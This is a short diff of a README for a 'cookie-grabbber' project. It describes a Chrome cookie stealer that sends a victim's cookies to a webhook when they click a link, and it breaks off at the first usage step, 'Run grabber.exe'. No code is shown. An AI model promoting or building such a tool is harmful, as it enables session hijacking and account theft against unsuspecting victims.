@@ -1,6 +1,7 @@
 # cookie-grabbber
-This will grab all chrome cookies
-A simple chrome cookie grabber. When you victim clicks on a link their cookies are sent to a webhook.
+Cookie Grabber
+
+This is a simple chrome cookie grabber. When you victim clicks on a link their cookies are sent to a webhook.
 
 How to use 
 1. Run grabber.exe 
